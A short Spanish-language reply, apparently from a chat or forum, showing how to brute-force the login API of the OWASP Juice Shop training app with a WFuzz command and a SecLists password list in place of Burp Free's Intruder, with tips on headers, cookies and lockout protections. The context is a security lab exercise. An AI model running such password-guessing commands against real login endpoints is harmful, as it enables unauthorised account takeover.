El límite de Burp Free está en **Intruder**, no permite ataques masivos automáticos. Para un brute-force de API puedes replicar la misma lógica con **WFuzz o Curl + un diccionario**, que no tienen limitaciones. La clave es respetar exactamente el formato JSON que te indica Burp.

Tu ejemplo de Burp usa:

```json
{"email":"admin@juice-sh.op","password":"§§"}
```

En WFuzz lo traduces así:

```bash
wfuzz -c -z file,/usr/share/seclists/Passwords/Common-Credentials/best1050.txt \
-u http://10.201.93.234/rest/user/login \
-H "Content-Type: application/json" \
-H "Accept: application/json" \
-d '{"email":"admin@juice-sh.op","password":"FUZZ"}'
```

- `FUZZ` reemplaza `§§` de Burp.
- `-c` para colores.
- `-z file,<ruta>` carga el diccionario.

Si todas las respuestas siguen siendo **401**, hay que verificar:

1.  **Escape correcto del JSON:** en la terminal, usa comillas simples externas y dobles internas.
2.  **Headers requeridos:** algunos endpoints necesitan `Accept` o cookies específicas (`io=...`, `continueCode=...`) que Burp captura automáticamente.
3.  **Protección anti-brute-force:** throttling, lockout o tokens dinámicos.